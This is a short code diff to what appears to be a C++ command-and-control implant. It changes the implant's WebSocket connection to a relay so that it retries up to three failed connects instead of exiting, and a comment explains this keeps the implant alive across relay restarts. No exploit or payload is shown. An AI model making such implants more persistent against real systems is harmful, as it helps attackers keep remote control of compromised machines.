@@ -154,6 +154,10 @@ INT32 start()
 
     Context context;
     UINT32 connectionAttempt = 0;
+    // Consecutive failed connects allowed before giving up — a relay restart/redeploy
+    // must not kill the implant on its first reconnect racing the relay's boot.
+    constexpr UINT32 MaxConnectFailures = 3;
+    UINT32 connectFailures = 0;
 
     CommandHandler commandHandlers[CommandType::CommandTypeCount] = {nullptr};
     // Core (mandatory, always registered)
@@ -208,8 +212,11 @@ INT32 start()
         if (!createResult)
         {
             LOG_ERROR("Connection attempt #%u failed: unable to open WebSocket to %s", connectionAttempt, (PCCHAR)urlBuffer);
-            return 0;
+            if (++connectFailures > MaxConnectFailures)
+                return 0;
+            continue;
         }
+        connectFailures = 0;
         WebSocketClient &wsClient = createResult.Value();
         LOG_INFO("WebSocket connection established (attempt #%u) to %s (identity sent in upgrade headers)",
                  connectionAttempt, (PCCHAR)urlBuffer);
